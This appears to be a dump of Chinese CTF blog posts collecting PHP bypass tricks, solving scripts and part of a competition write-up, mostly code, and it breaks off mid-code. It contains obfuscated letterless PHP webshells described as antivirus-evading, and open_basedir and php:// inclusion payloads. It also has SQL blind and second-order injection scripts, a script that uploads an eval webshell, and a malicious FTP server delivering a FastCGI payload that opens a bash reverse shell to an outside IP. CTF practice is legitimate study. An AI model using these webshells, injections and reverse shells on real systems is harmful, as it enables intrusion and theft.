$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$__/$__;$____='';$___=\"瞰\";$____.=~($___&#123;$_&#125;);$___=\"和\";$____.=~($___&#123;$__&#125;);$___=\"和\";$____.=~($___&#123;$__&#125;);$___=\"的\";$____.=~($___&#123;$_&#125;);$___=\"半\";$____.=~($___&#123;$_&#125;);$___=\"始\";$____.=~($___&#123;$__&#125;);$_____='_';$___=\"俯\";$_____.=~($___&#123;$__&#125;);$___=\"瞰\";$_____.=~($___&#123;$__&#125;);$___=\"次\";$_____.=~($___&#123;$_&#125;);$___=\"站\";$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);POST 2=phpinf();\n\n![image-20210824093035835](F:\\D-学习笔记\\BUUCTF WP\\image-20210824093035835.png)\n\n注意事项：这个写在php文件中能直接运行，通过GET传参就报错 eval()&#39;d code:1 Stack trace:，经过多次测试，需要进行url编码提交才不会报错。\n\n递增运算得到对应字符这个就直接上代码，方式不一样，目的一样。\np神案例 // ASSERT($_POST[_]); 这个仅支持 php5 php7 需要更换assert 为其他代码执行函数 &lt;?php $_=[];$_=@\"$_\"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); POST _=phpinfo();// 自己构造的命令执行  (SYSTEM)($_POST[_]); 函数自调用 需要php7.0 以上&lt;?=$_=[]?&gt;&lt;?=$_=\"$_\"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$_____=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$______=$__++?&gt;&lt;?=$_______=$__++?&gt;&lt;?=$__++?&gt; &lt;?=$__++?&gt;&lt;?=$________=$__++?&gt;&lt;?=$_________________=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__________=$__++?&gt;&lt;?=$_________=$________.$__________.$________.$_________________.$____.$_____?&gt;&lt;?=($_________)($&#123;'_'.$_______.$______.$________.$_________________&#125;[_])?&gt;    // 可做免杀马 不能直接POST提交 会报 Parse error: syntax error, unexpected '&lt;', expecting end of file in// 编码也没用\n\n![image-20210824104232105](F:\\D-学习笔记\\BUUCTF WP\\image-20210824104232105.png)\n绕过 open_basedir/disable_function\nopen_basedir是php.ini中的一个配置选项它可将用户访问文件的活动范围限制在指定的区域，假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。注意用open_basedir指定的限制实际上是前缀,而不是目录名。举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。\n\npayload\nchdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(file_get_contents(&apos;/THis_Is_tHe_F14g&apos;));\n\n也可以用蚁剑 disable_functions 插件绕过\nphp伪协议file:// \n用于访问文件（绝对路径、相对路径、网络路径）\nhttp://www.xx.com?file=file:///etc/passswd\n\nphp://\n访问输入输出流\nhttp://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[文件名]（针对php文件需要base64编码）\n\n参数\nresource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。\n\nphp://input\nhttp://127.0.0.1/cmd.php?cmd=php://inputPOST数据：&lt;?php phpinfo()?&gt;\n\n注意：enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的\ndata:// \n\n自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输\n\nhttp://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n\n来源：https://www.cnblogs.com/wjrblogs/p/12285202.html\nextract变量覆盖SESSION验证绕过&lt;?php$flag = \"flag\";session_start(); if (isset ($_GET['password'])) &#123;    if ($_GET['password'] == $_SESSION['password'])        die ('Flag: '.$flag);    else        print '&lt;p&gt;Wrong guess.&lt;/p&gt;';&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt;# ?password=# 初始状态session为空，因此password也传入空值即可\n\nmd5加密相等绕过var_dump(md5('240610708') == md5('QNKCDZO'));var_dump(md5('aabg7XSs') == md5('aabC9RqS'));var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));var_dump('0010e2' == '1e3');var_dump('0x1234Ab' == '1193131');var_dump('0xABCdef' == ' 0xABCdef');// 都返回 bool(true)\n\nmd5函数true绕过注入&lt;?php error_reporting(0);$link = mysql_connect('localhost', 'root', 'root');if (!$link) &#123;   die('Could not connect to MySQL: ' . mysql_error()); &#125; // 选择数据库$db = mysql_select_db(\"security\", $link);if(!$db)&#123;  echo 'select db error';  exit();&#125;// 执行sql$password = $_GET['password'];$sql = \"SELECT * FROM users WHERE password = '\".md5($password,true).\"'\";var_dump($sql);$result=mysql_query($sql) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );$row1 = mysql_fetch_row($result);var_dump($row1);mysql_close($link);?&gt;\n\n?password=ffifdyop只需md5($password,true)包含&apos; or &apos;xxx这样的字符即可绕过，SQL即变成：SELECT * FROM admin WHERE pass = &apos;&apos; or &apos;xxx&apos;字符串ffifdyop，md5后为276f722736c95d99e921722cf9ed621c，hex转换为字符串为：&apos;or&apos;6&lt;trash&gt;\n\n代码审计绕过特殊案例&lt;?phperror_reporting(0);include \"flag.php\";highlight_file(__file__);if(isset($_GET['args']))&#123;    $args = $_GET['args'];    if(!preg_match(\"/^\\w+$/\",$args))&#123;        die(\"args error!\");    &#125;    eval(\"var_dump($$args);\");//这里涉及超全局变量的使用&#125;?&gt;\n\n?args=GLOBALS\n\n通过json_decode特性绕过\n&lt;?phpif (isset($_POST['message'])) &#123;    $message = json_decode($_POST['message']);    $key =\"*********\";    if ($message-&gt;key == $key) &#123;        echo \"flag\";    &#125;    else &#123;        echo \"fail\";    &#125;&#125;else&#123;    echo \"~~~~\";&#125;\n\nmessage=&#123;&quot;key&quot;:true&#125;\n\n&lt;?phperror_reporting(0);if (empty($_GET['b'])) &#123;    show_source(__FILE__);    die();&#125;else&#123;    include('flag.php');$a = \"www.XMAN.com\";$b = $_GET['b'];@parse_str($b);if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) &#123;    echo $flag;&#125;else&#123;exit('你的答案不对0.0');&#125;&#125;?&gt;\n\n?b=a[0]=s878926199a\n\n&lt;?phpif(isset($_POST['login']))&#123;    if(isset($_POST['user']))    &#123;        if(@strcmp($_POST['user'],$USER))//USER是被隐藏的复杂用户名        &#123;            die('user错误！');        &#125;    &#125;    if (isset($_POST['name']) &amp;&amp; isset($_POST['password']))    &#123;        if ($_POST['name'] == $_POST['password'] )        &#123;            die('账号密码不能一致！');        &#125;        if (md5($_POST['name']) === md5($_POST['password']))        &#123;            if(is_numeric($_POST['id'])&amp;&amp;$_POST['id']!=='72' &amp;&amp; !preg_match('/\\s/', $_POST['id']))            &#123;                if($_POST['id']==72)                    die(\"flag...\");                else                    die(\"ID错误2！\");            &#125;            else            &#123;                die(\"ID错误1！\");            &#125;        &#125;        else            die('账号密码错误！');    &#125;&#125;\n\nuser[]=1&amp;name[]=1&amp;password[]=2&amp;id=72.0&amp;login=Checkoruser[]=1&amp;name[]=1&amp;password[]=2&amp;id=072&amp;login=Check\n\n","categories":["CTF","CTF做题姿势总结"],"tags":["CTF","总结"]},{"title":"CTF-解题脚本集合","url":"/2021/11/09/CTF-%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC%E9%9B%86%E5%90%88/","content":"将伪随机数转换成php_mt_seed可以识别的数据格式import requestsimport randomdict1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'dict2='KVQP0LdJKRaV3n9D'dict3 = dict1[::-1]     length = len(dict2)    res=''for i in range(len(dict2)):    for j in range(len(dict1)):        if dict2[i] == dict1[j]:            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(dict1)-1)+' '            breakprint(res)\n\nSQL盲注脚本import requestsurl='http://bdeb176a-4425-4fe9-997e-02afb5312134.node3.buuoj.cn/index.php'flag=''for i in range(50):    a = 32    b = 128    mid = (a+b)//2    while(a&lt;b):                 #stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0)   爆表名                  #stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag')),1,1))&gt;0)  爆列名        print(mid)        payload = url+\"?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)\"%(i,mid)        import time        time.sleep(1)        re = requests.get(url=payload)        # 首先判断目标值 是否小于         if 'admin' in re.text:            a = mid + 1        else:            # 目标值 大于 则直接 将 mid 赋值给 b            b = mid        mid = (a+b)//2    # 这个二分查找的方式是 完整的走完一遍，也就是跑7次     if (mid==32|mid==128):        break    flag +=chr(mid)    print(flag)\n\n盲注二次注入import requests,reflag_hex = ''# email=a9%40qq.com&amp;username='%2bsubstr((hex(hex((select * from flag))))from 1 for 10)%2b'&amp;password=1url_reg = \"http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/register.php\"url_login = \"http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/login.php\"for i in range(100):    reg_data = &#123;        'email': 'b%d@qq.com'%(i),        'username': \"'+substr((hex(hex((select * from flag))))from %d for 10)+'\"%(i*10+1),        'password': '1'    &#125;    requests.post(url=url_reg, data=reg_data)    data_login = &#123;        'email': 'b%d@qq.com'%(i),        'password': '1'    &#125;    res = requests.post(url=url_login, data=data_login)    res = re.findall(r'&lt;span class=\"user-name\"&gt;(.*?)&lt;/span&gt;', res.text,re.S)[0].strip()    print(res)    if res == '0':        break    flag_hex +=res    print(flag_hex)\n\n无字母数字webshell-异或绕过构建脚本import urllib.parsefind = ['a','q','u','_','i','s','c','t','e']for i in range(1,256):    for j in range(1,256):        result = chr(i^j)        if(result in find):            a = i.to_bytes(1,byteorder='big')            b = j.to_bytes(1,byteorder='big')            a = urllib.parse.quote(a)            b = urllib.parse.quote(b)            print(\"%s:%s^%s\"%(result,a,b))            # $&#123;%FF%FF%FF^%B8%BA%AB&#125;&#123;%FF^%A0&#125;();            # aqua_is_cute            # %FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF^%9E%8E%8A%9E%A0%96%8C%A0%9C%8A%8B%9A\n\n&lt;?php$l = \"\";$r = \"\";$argv = str_split(\"_POST\");for ($i = 0; $i &lt; count($argv); $i++) &#123;    for ($j = 0; $j &lt; 255; $j++) &#123;        $k = chr($j) ^ chr(255); // dechex(255) = ff        if ($k == $argv[$i]) &#123;            if ($j &lt; 16) &#123;                $l .= \"%ff\";                $r .= \"%0\" . dechex($j);                continue;            &#125;            $l .= \"%ff\";            $r .= \"%\" . dechex($j);            continue;        &#125;    &#125;&#125;echo \"\\&#123;$l`$r\\&#125;\";\n\n无字母数字webshell构造&lt;?phpheader('Content-Type: text/html; charset=utf-8');$str = '当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”';for($i=0; $i&lt;mb_strlen($str, 'utf-8'); $i++)&#123;    $st = mb_substr($str, $i,1, 'utf-8');    $a = ~($st);    $b = $a[1];\t\t\t\t#取汉字的第一位    if($b==$_GET['a'])\t\t#$_GET['a']想要得到的字符    &#123;        echo $st;exit;    &#125;&#125;// 用法//$_=~('北')[1]//#s//同理构造。system。为什么不构造eval呢。大家可以去尝试一下//$a='system';//$b='eval';//这两者动态调用的区别//system是个函数。可以动态调用。而eval是PHP语法的一部分。并不是函数。不能动态调用?&gt;\n\n无列名注入import requestsurl='http://7a93d6a2-cc99-43d5-aaa6-aab30f35ff99.node4.buuoj.cn:81/'payload='-1||((select 1,\"&#123;&#125;\")&gt;(select * from f1ag_1s_h3r3_hhhhh))'flag=''for j in range(1,50):    for i in range(32,128):        hexchar=flag+chr(i)        py=payload.format(hexchar)        print(py)        datas=&#123;'id':py&#125;        import time        time.sleep(1)        re=requests.post(url=url,data=datas)        if 'Nu1L' in re.text:            flag+=chr(i-1)            print(flag)            break\n\n正则回溯import requestsfrom io import BytesIOdata = &#123;  'treasure': BytesIO(b'flag.php' + b' a' * 1000000)&#125;res = requests.post('http://119.61.19.217:57305/treasure.php', data=data)print(res.text)\n\npython文件上传import requestsfrom io import BytesIOurl = \"http://8c8e609f-51ac-48b8-82ea-0f19cc24e3ea.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"payload = \"&lt;?php eval($_POST['cmd']);?&gt;\"file_data = &#123;\"file\": BytesIO(payload.encode())&#125;res = requests.post(url=url,files=file_data, allow_redirects=False)print(res)\n\nRC加密import base64from urllib import parsedef rc4_main(key = \"init_key\", message = \"init_message\"):#返回加密后得内容    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))     j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_boxdef rc4_excrypt(plain, box):    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    cipher = \"\".join(res)    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))key = \"HereIsTreasure\"  #此处为密文message = input(\"请输入明文:\\n\")enc_base64 = rc4_main( key , message )enc_init = str(base64.b64decode(enc_base64),'utf-8')enc_url = parse.quote(enc_init)print(\"rc4加密后的url编码:\"+enc_url)#print(\"rc4加密后的base64编码\"+enc_base64)\n\nSSRF-恶意的 ftp 服务器（一）import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23))s.listen(1)conn, addr = s.accept()conn.send(b'220 welcome\\n')#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b'331 Please specify the password.\\n')#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b'230 Login successful.\\n')#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b'200 Switching to Binary mode.\\n')#Size /conn.send(b'550 Could not get the file size.\\n')#EPSV (1)conn.send(b'150 ok\\n')#PASVconn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n') #STOR / (2)conn.send(b'150 Permission denied.\\n')#QUITconn.send(b'221 Goodbye.\\n')conn.close()\n\nSSRF-恶意的 ftp 服务器（二）# -*- coding: utf-8 -*-# @Time    : 2021/1/13 6:56 下午# @Author  : tntaxin# @File    : ftp_redirect.py# @Software:import socketfrom urllib.parse import unquote# 对gopherus生成的payload进行一次urldecodepayload = unquote(\"%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\")payload = payload.encode('utf-8')host = '0.0.0.0'port = 23sk = socket.socket()sk.bind((host, port))sk.listen(5)# ftp被动模式的passvie port,监听到1234sk2 = socket.socket()sk2.bind((host, 1234))sk2.listen()# 计数器，用于区分是第几次ftp连接count = 1while 1:    conn, address = sk.accept()    conn.send(b\"200 \\n\")    print(conn.recv(20))  # USER aaa\\r\\n  客户端传来用户名    if count == 1:        conn.send(b\"220 ready\\n\")    else:        conn.send(b\"200 ready\\n\")    print(conn.recv(20))   # TYPE I\\r\\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本    if count == 1:        conn.send(b\"215 \\n\")    else:        conn.send(b\"200 \\n\")    print(conn.recv(20))  # SIZE /123\\r\\n  客户端询问文件/123的大小    if count == 1:        conn.send(b\"213 3 \\n\")      else:        conn.send(b\"300 \\n\")    print(conn.recv(20))  # EPSV\\r\\n'    conn.send(b\"200 \\n\")    print(conn.recv(20))   # PASV\\r\\n  客户端告诉服务端进入被动连接模式    if count == 1:        conn.send(b\"227 127,0,0,1,4,210\\n\")  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234    else:        conn.send(b\"227 127,0,0,1,35,40\\n\")  # 端口计算规则：35*256+40=9000    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\\r\\n，第二次连接会收到STOR /123\\r\\n    if count == 1:        conn.send(b\"125 \\n\") # 告诉客户端可以开始数据连接了        # 新建一个socket给服务端返回我们的payload        print(\"建立连接!\")        conn2, address2 = sk2.accept()        conn2.send(payload)        conn2.close()        print(\"断开连接!\")    else:        conn.send(b\"150 \\n\")        print(conn.recv(20))        exit()    # 第一次连接是下载文件，需要告诉客户端下载已经结束    if count == 1:        conn.send(b\"226 \\n\")    conn.close()    count += 1\n\n","categories":["CTF","CTF做题姿势总结"],"tags":["CTF","总结"]},{"title":"9月DASCTF Sept X 浙江工业大学秋季挑战赛WP","url":"/2021/09/25/DASCTF%20Sept%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9BWP/","content":"\ncrypto-签到题目#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomflag=b'flag&#123;******************&#125;'n = 2 ** 256flaglong=bytes_to_long(flag)m = random.randint(2, n-1) | 1c = pow(m, flaglong, n)print('m = ' + str(m))print('c = ' + str(c))# m = 73964803637492582853353338913523546944627084372081477892312545091623069227301# c = 21572244511100216966799370397791432119463715616349800194229377843045443048821\n\n解题脚本from sympy.ntheory import discrete_logn = 2 ** 256m = 73964803637492582853353338913523546944627084372081477892312545091623069227301c = 21572244511100216966799370397791432119463715616349800194229377843045443048821flag = discrete_log(n,c,m)print(hex(flag))# flag&#123;DASCTF_zjut&#125;\n\nmisc-Girlfriend’s account解题过程=SUM(ISNUMBER(SEARCH(TEXT(&#123;1,2,3,4,5,6,7,8,9&#125;,&quot;[dbnum2]&quot;&amp;&#123;&quot;0亿&quot;;&quot;0仟!*万&quot;;&quot;0佰!*万&quot;;&quot;0拾!*万&quot;;&quot;0万&quot;;&quot;万!*0仟&quot;;&quot;万!*0佰&quot;;&quot;万!*0拾&quot;;&quot;0元&quot;;&quot;0角&quot;;&quot;0分&quot;&#125;),IF(ISERR(FIND(&quot;万&quot;,A2)),&quot;万&quot;,)&amp;A2))*&#123;1,2,3,4,5,6,7,8,9&#125;*10^&#123;8;7;6;5;4;3;2;1;0;-1;-2&#125;)\n\n=IF(B2=&quot;壹&quot;,1,IF(B2=&quot;贰&quot;,2,IF(B2=&quot;叁&quot;,3,IF(B2=&quot;肆&quot;,4,IF(B2=&quot;伍&quot;,5,IF(B2=&quot;陆&quot;,6,IF(B2=&quot;柒&quot;,7,IF(B2=&quot;捌&quot;,8,IF(B2=&quot;玖&quot;,9,IF(B2=&quot;零&quot;,0))))))))))\n\n\nweb-hellounser考点反序列化（pop链构造）\npreg_match绕过\n前置知识魔术方法\n__invoke\t当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。__toString\t方法用于一个类被当成字符串时应怎样回应。(当类被 echo 当成字符串输出时，会调用该方法)\n\n解题过程打开 &lt;?phpclass A &#123;    public $var;    public function show()&#123;        echo $this-&gt;var;    &#125;    public function __invoke()&#123;        $this-&gt;show();    &#125;&#125;class B&#123;    public $func;    public $arg;        public function show()&#123;        $func = $this-&gt;func;        if(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this-&gt;arg)) &#123;             die('No!No!No!');         &#125; else &#123;             include \"flag.php\";            //There is no code to print flag in flag.php            $func('', $this-&gt;arg);         &#125;    &#125;        public function __toString()&#123;        $this-&gt;show();        return \"&lt;br&gt;\".\"Nice Job!!\".\"&lt;br&gt;\";    &#125;        &#125;if(isset($_GET['pop']))&#123;    $aaa = unserialize($_GET['pop']);    $aaa();&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\n分析构造利用链\n比较简单\n# $aaa();-&gt;A::__invoke() -&gt;A::show() -&gt; B::__toString -&gt;B::show()\n\n通过$aaa();调用触发 A::__invoke()，A::__invoke()会触发A::show()，A::show()中有个echo输出，会触发B::__toString，B::__toString会触发B::show()；\n接下来就是绕过。\ngetflagif(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || 